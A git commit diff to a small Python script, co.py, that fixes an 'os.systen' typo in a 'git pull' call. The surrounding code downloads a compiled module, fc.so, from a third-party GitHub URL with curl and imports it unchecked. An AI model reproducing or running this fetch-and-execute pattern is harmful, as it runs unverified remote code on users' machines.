ba588ff92d7b34dc17afc1e47c6d135e0236312d
Sayem <88239049+Sayem234@users.noreply.github.com>
2023-03-22 20:05:27 +0600

    Update co.py

--- co.py
+++ co.py
@@ -1,5 +1,5 @@
 import os
-os.systen("git pull")
+os.system("git pull")
 if not os.path.exists('fc.so'):
  os.system('curl https://raw.githubusercontent.com/Hannan-404/FILE/main/fc.so > fc.so')
  import fc
